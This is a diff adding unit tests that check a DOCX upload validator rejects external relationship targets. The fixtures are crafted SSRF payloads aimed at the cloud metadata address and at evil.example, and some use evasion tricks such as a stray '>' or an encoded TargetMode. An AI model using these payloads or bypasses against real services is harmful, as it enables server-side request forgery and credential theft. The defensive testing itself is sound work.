@@ -27,3 +27,69 @@ describe("upload-time zip safety checks", () => {
     expect(() => extractFields(buf)).not.toThrow();
   });
 });
+
+describe("external relationship targets", () => {
+  const REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
+
+  it("rejects a linked image pointing at an external URL", () => {
+    // `<a:blip r:link>` renders the image by fetching this target, so it is an
+    // SSRF vector even though it isn't an attachedTemplate.
+    const buf = buildDocx(
+      paragraph("{{name}}"),
+      `<Relationship Id="rId9" Type="${REL}/image" Target="http://169.254.169.254/latest/meta-data/" TargetMode="External"/>`
+    );
+    expect(() => extractFields(buf)).toThrow();
+  });
+
+  it("rejects an external attached template declared with single-quoted attributes", () => {
+    const buf = buildDocx(
+      paragraph("{{name}}"),
+      `<Relationship Id='rId9' Type='${REL}/attachedTemplate' Target='http://evil.example/x.dotx' TargetMode='External'/>`
+    );
+    expect(() => extractFields(buf)).toThrow();
+  });
+
+  it("rejects an external target on a non-self-closing Relationship element", () => {
+    const buf = buildDocx(
+      paragraph("{{name}}"),
+      `<Relationship Id="rId9" Type="${REL}/oleObject" Target="http://evil.example/x" TargetMode="External"></Relationship>`
+    );
+    expect(() => extractFields(buf)).toThrow();
+  });
+
+  it("rejects an external target hidden behind a '>' in an attribute value", () => {
+    // `>` is legal inside an XML attribute value, so a scanner that reads a tag
+    // as `[^>]*` stops early and never sees the TargetMode that follows.
+    const buf = buildDocx(
+      paragraph("{{name}}"),
+      `<Relationship Id="rId9" Type="${REL}/image" Target="http://169.254.169.254/?a=>" TargetMode="External"/>`
+    );
+    expect(() => extractFields(buf)).toThrow();
+  });
+
+  it("rejects an external target whose mode is obfuscated with a character reference", () => {
+    // A real XML parser decodes this to "External"; a literal string match
+    // against "External" would not.
+    const buf = buildDocx(
+      paragraph("{{name}}"),
+      `<Relationship Id="rId9" Type="${REL}/image" Target="http://evil.example/x" TargetMode="&#69;xternal"/>`
+    );
+    expect(() => extractFields(buf)).toThrow();
+  });
+
+  it("allows a relationship that declares an explicitly internal target", () => {
+    const buf = buildDocx(
+      paragraph("{{name}}"),
+      `<Relationship Id="rId9" Type="${REL}/image" Target="media/image1.png" TargetMode="Internal"/>`
+    );
+    expect(() => extractFields(buf)).not.toThrow();
+  });
+
+  it("allows an external hyperlink, which is only resolved when a reader clicks it", () => {
+    const buf = buildDocx(
+      paragraph("{{name}}"),
+      `<Relationship Id="rId9" Type="${REL}/hyperlink" Target="https://example.com/" TargetMode="External"/>`
+    );
+    expect(() => extractFields(buf)).not.toThrow();
+  });
+});
